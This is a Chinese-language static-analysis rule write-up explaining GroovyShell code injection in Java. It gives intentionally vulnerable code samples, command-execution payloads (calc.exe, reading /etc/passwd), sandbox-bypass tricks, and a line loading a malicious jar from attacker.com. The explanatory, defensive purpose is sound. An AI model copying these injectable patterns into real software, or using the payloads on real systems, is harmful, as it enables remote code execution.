# Java中GroovyShell代码执行漏洞 完整描述

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`other_groovyshell_codei` · 类别：codei · 关键 sink：GroovyClassLoader, GroovyShell, TemplateEngine, createTemplate, evaluate, parse, parseClass, run
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


### Java中GroovyShell代码执行漏洞 完整描述
#### 一、漏洞背景与核心定义
Groovy是基于JVM的动态脚本语言，与Java完全兼容且可无缝调用Java类/方法；`GroovyShell`是Groovy提供的核心工具类，用于在Java程序中**动态解析、编译并执行Groovy脚本**，核心API包括`evaluate(String script)`、`parse(String script)`、`run(String script, String[] args)`等。

该漏洞的本质是：若`GroovyShell`执行的脚本内容可被攻击者控制（直接/间接），攻击者可构造恶意Groovy代码，使其以宿主Java程序的JVM进程权限执行，最终实现**任意代码执行（RCE）** ——这并非Groovy本身的“漏洞”，而是`GroovyShell`被不当使用（输入未校验、权限未限制）导致的安全风险，也是动态脚本执行类漏洞的典型代表。

#### 二、漏洞核心成因
1. **Groovy与Java的无隔离性**：Groovy设计上支持直接调用Java的所有类/方法（如`java.lang.Runtime`、`java.lang.ProcessBuilder`），无天然的沙箱隔离，Groovy脚本的执行权限与宿主Java程序完全一致；
2. **输入可控性**：用户输入、第三方接口返回、配置文件、数据库等不可信数据源的内容，未经过滤/验证直接/间接传入`GroovyShell`的执行方法；
3. **默认无安全限制**：`GroovyShell`默认配置（`CompilerConfiguration`）未禁用危险类/方法、未限制类加载器权限，脚本可无约束地调用任意系统资源。

#### 三、漏洞的各种触发场景（附代码示例）
##### 场景1：直接可控脚本内容（最典型、最易触发）
**场景描述**：Java程序将用户可控的输入（如HTTP请求参数、表单数据）直接作为`GroovyShell`的执行脚本，无任何过滤。
**代码示例**：
```java
import groovy.lang.GroovyShell;
import javax.servlet.http.HttpServletRequest;

public class VulnServlet {
    public void doPost(HttpServletRequest request) {
        // 直接获取用户输入作为脚本内容（可控）
        String userInput = request.getParameter("script");
        // 初始化GroovyShell并执行脚本
        GroovyShell groovyShell = new GroovyShell();
        // 执行恶意脚本，触发代码执行
        groovyShell.evaluate(userInput);
    }
}
```
**攻击方式**：攻击者向`script`参数传入恶意Groovy代码，例如：
```groovy
// 执行系统命令（Windows弹出计算器，Linux执行bash命令）
Runtime.getRuntime().exec("calc.exe");
// 或跨平台写法
new ProcessBuilder("cmd", "/c", "calc").start();
```

##### 场景2：脚本模板拼接注入（间接可控）
**场景描述**：程序预设Groovy脚本模板，仅将用户输入作为“变量值”拼接进模板，攻击者通过构造输入突破变量边界，注入恶意代码。
**代码示例**：
```java
import groovy.lang.GroovyShell;

public class TemplateVuln {
    public void execute(String userInput) {
        // 脚本模板：本意让用户输入作为变量x的值
        String scriptTemplate = "def x = " + userInput + "; println(x)";
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(scriptTemplate);
    }
}
```
**攻击方式**：攻击者输入`1; Runtime.getRuntime().exec("calc.exe")`，拼接后的脚本变为：
```groovy
def x = 1; Runtime.getRuntime().exec("calc.exe"); println(x)
```
执行时先赋值`x=1`，再执行恶意命令，绕过“仅输入变量值”的预期。

##### 场景3：间接可控数据源（配置/数据库/缓存）
**场景描述**：用户输入不直接传入`GroovyShell`，但可篡改程序依赖的间接数据源（如配置文件、数据库字段、Redis缓存），这些数据源的内容被程序读取后传入`GroovyShell`执行。
**代码示例**：
```java
import groovy.lang.GroovyShell;
import java.sql.ResultSet;

public class DBVuln {
    public void executeFromDB() throws Exception {
        // 从数据库读取“业务配置脚本”（攻击者已篡改该字段）
        ResultSet rs = getDBConnection().executeQuery("SELECT script FROM config WHERE id=1");
        String script = rs.getString("script");

        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(script); // 执行被篡改的恶意脚本
    }
}
```
**攻击方式**：攻击者通过SQL注入、后台弱口令等方式修改数据库中`script`字段的值为恶意Groovy代码，程序读取后执行。

##### 场景4：GroovyShell配置不当（无安全限制）
**场景描述**：程序虽尝试限制`GroovyShell`的执行权限，但因`CompilerConfiguration`配置错误（如未启用安全模式、未禁用危险类），导致限制失效。
**错误配置示例**：
```java
import groovy.lang.GroovyShell;
import org.codehaus.groovy.control.CompilerConfiguration;

public class ConfigVuln {
    public void unsafeConfig() {
        CompilerConfiguration config = new CompilerConfiguration();
        // 未设置任何安全限制（默认配置），脚本可调用任意Java类
        GroovyShell groovyShell = new GroovyShell(config);
        // 即使输入经过简单过滤，攻击者仍可调用其他危险类
        groovyShell.evaluate("new ProcessBuilder('bash', '-c', 'cat /etc/passwd').start()");
    }
}
```
**补充**：若错误地认为“禁用Runtime类就安全”，但未禁用`ProcessBuilder`、`java.lang.Class`等，攻击者仍可绕过。

##### 场景5：框架集成场景（Spring/Spring Boot）
**场景描述**：在Spring生态中，`GroovyShell`常被用于动态配置、模板渲染等场景，若结合框架特性（如`@Value`注解、Groovy模板引擎）处理不可信输入，易触发漏洞。
**示例1：Spring Boot + @Value注解**
```java
import groovy.lang.GroovyShell;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

@Component
public class SpringVuln {
    // 从配置文件/环境变量读取脚本（攻击者可篡改环境变量）
    @Value("${dynamic.script}")
    private String dynamicScript;

    public void execute() {
        new GroovyShell().evaluate(dynamicScript);
    }
}
```
**示例2：Groovy模板引擎注入**
Groovy的`TemplateEngine`（如`SimpleTemplateEngine`）本质仍是执行Groovy脚本，若模板内容包含用户输入，同样触发漏洞：
```java
import groovy.text.SimpleTemplateEngine;
import java.util.HashMap;
import java.util.Map;

public class TemplateEngineVuln {
    public void render(String userInput) throws Exception {
        SimpleTemplateEngine engine = new SimpleTemplateEngine();
        // 模板中嵌入用户输入
        String template = "Hello, ${userInput}!";
        Map<String, Object> binding = new HashMap<>();
        binding.put("userInput", userInput);
        // 渲染模板时执行Groovy表达式，攻击者构造恶意表达式
        engine.createTemplate(template).make(binding).toString();
    }
}
```
**攻击方式**：用户输入`${Runtime.getRuntime().exec("calc.exe")}`，模板渲染时执行该恶意表达式。

##### 场景6：序列化/反序列化触发
**场景描述**：若`GroovyShell`生成的`Script`对象、`GroovyShell`实例本身被序列化存储（如Redis、文件），攻击者可构造恶意序列化数据，反序列化时触发脚本执行；或反序列化过程中引入可控的Groovy脚本内容。
**风险示例**：
```java
import groovy.lang.GroovyShell;
import groovy.lang.Script;
import java.io.*;

public class SerializeVuln {
    // 序列化Script对象
    public void serializeScript() throws Exception {
        GroovyShell shell = new GroovyShell();
        Script script = shell.parse("Runtime.getRuntime().exec('calc.exe')");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("script.ser"));
        oos.writeObject(script);
        oos.close();
    }

    // 反序列化时执行脚本（若攻击者替换script.ser为恶意内容）
    public void deserializeScript() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("script.ser"));
        Script script = (Script) ois.readObject();
        script.run(); // 反序列化后执行恶意脚本
    }
}
```

##### 场景7：沙箱绕过场景（尝试限制但失效）
**场景描述**：程序尝试通过自定义类加载器、黑名单禁用危险类（如`Runtime`），但攻击者利用Groovy的动态特性（元编程、反射、类加载器）绕过沙箱限制。
**常见绕过方式**：
1. 黑名单绕过：禁用`Runtime`但调用`ProcessBuilder`：
   ```groovy
   new ProcessBuilder("cmd", "/c", "calc").start()
   ```
2. 反射绕过：通过`Class.forName`加载禁用类：
   ```groovy
   Class rt = Class.forName("java.lang.Runtime");
   rt.getMethod("getRuntime").invoke(null).exec("calc.exe");
   ```
3. 元编程绕过：利用Groovy的元对象协议（MOP）调用隐藏方法：
   ```groovy
   this.metaClass.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe")
   ```
4. 类加载器绕过：自定义类加载器加载恶意类：
   ```groovy
   def cl = new java.net.URLClassLoader([new URL("http://attacker.com/malicious.jar")] as URL[]);
   cl.loadClass("com.attacker.MaliciousClass").newInstance().exec();
   ```

#### 四、漏洞表现形式与危害
1. **执行系统命令**：以宿主进程权限执行任意系统命令（如挖矿、勒索、删除文件、创建后门）；
2. **读写文件**：读取服务器敏感文件（`/etc/passwd`、`application.yml`）、写入恶意文件（webshell）；
3. **操作JVM/进程**：修改程序内存、终止进程、加载恶意字节码；
4. **内网横向移动**：利用服务器权限访问内网资源（如扫描内网端口、攻击其他主机）；
5. **数据泄露/破坏**：篡改数据库、窃取业务数据（用户信息、支付数据）。

#### 五、Groovy版本对漏洞的影响
- Groovy 1.x/2.x：默认无任何安全限制，漏洞触发成本极低；
- Groovy 3.x+：新增部分安全特性（如`SecureASTCustomizer`），但默认仍未启用，需手动配置；若未配置安全规则，漏洞依然存在；
- 核心结论：无论Groovy版本如何，只要`GroovyShell`执行的脚本内容可控，漏洞即可触发——版本仅影响“沙箱配置难度”，不改变漏洞本质。

